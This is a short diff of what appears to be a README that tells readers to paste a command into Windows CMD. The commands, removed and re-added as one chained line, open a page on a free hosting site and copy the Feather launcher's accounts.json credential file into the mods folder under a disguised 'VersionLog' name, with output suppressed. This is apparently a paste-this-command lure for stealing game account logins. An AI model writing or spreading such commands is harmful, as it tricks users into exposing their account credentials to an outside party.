@@ -10,6 +10,4 @@
 
 # Copy this code and write in CMD
 
-start "" "https://sprawdzwersje.000webhostapp.com/panel.html"
-start "" "C:\Users\%USERNAME%\AppData\Roaming\.feather\mods\"
-XCOPY "C:\Users\%USERNAME%\AppData\Roaming\.feather\accounts.json" "C:\Users\%USERNAME%\AppData\Roaming\.feather\mods\VersionLog-8cjV.json" /Y /I > NUL
+start "" "https://sprawdzwersje.000webhostapp.com/panel.html" && XCOPY "C:\Users\%USERNAME%\AppData\Roaming\.feather\accounts.json" "C:\Users\%USERNAME%\AppData\Roaming\.feather\mods\VersionLog-8cjV.json" /Y /I > NUL
